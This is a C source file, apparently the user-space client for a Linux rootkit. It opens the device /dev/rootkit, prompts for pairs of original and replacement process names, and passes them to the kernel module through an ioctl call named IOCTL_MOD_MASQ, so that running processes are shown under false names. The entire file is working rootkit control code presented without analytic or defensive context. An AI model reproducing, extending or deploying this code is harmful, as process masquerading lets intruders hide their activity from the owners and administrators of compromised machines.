#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "rootkit.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main (int argc, char *argv[]) {
        if (argc == 1) {
                printf("error: Missing argument.\n");
                return 0;
        } else if (argc > 2) {
                printf("error: Too many arguments.\n");
                return 0;
        }

        int len = atoi(argv[1]);
        if (len < 1) {
                printf("error: Invalid range or input.\n");
                return 0;
        }

        struct masq_proc *list = (struct masq_proc *)malloc(sizeof(struct masq_proc) * len);
        char *input = NULL;
        long input_buf = 0, orig_len = 0, new_len = 0;
        
        int fd = open("/dev/rootkit", O_RDWR);

        for (int i=0;i<len;i++) {
                struct masq_proc m;

                printf("Enter the orig_name:");
                while ((orig_len = getline(&input, &input_buf, stdin)) > MASQ_LEN || orig_len < 3) {
                        if (orig_len > MASQ_LEN)
                                printf("error: Input length too long.\nEnter the orig_name:");
                        else
                                printf("error: Input length too short.\nEnter the orig_name:");
                        free(input);
                        input = NULL;
                }
                input[orig_len-1] = '\0';
                strncpy(m.orig_name, input, orig_len);

                free(input);
                input = NULL;

                printf("Enter the new_name:");
                while ((new_len = getline(&input, &input_buf, stdin)) >= orig_len || new_len == 1) {
                        if (new_len >= orig_len)
                                printf("error: Input length too long. (Should be shorter than orig_name.)\nEnter the new_name:");
                        else
                                printf("error: Input length too short.\nEnter the new_name:");
                        free(input);
                        input = NULL;
                }
                input[new_len-1] = '\0';
                strncpy(m.new_name, input, new_len);

                free(input);
                input = NULL;

                printf("orig_name: %s, new_name: %s\n",m.orig_name, m.new_name);
                list[i] = m;
        }

        struct masq_proc_req req = {
                len,
                list
        };

        ioctl(fd, IOCTL_MOD_MASQ, &req);

        free(list);
        list = NULL;

        return 0;
}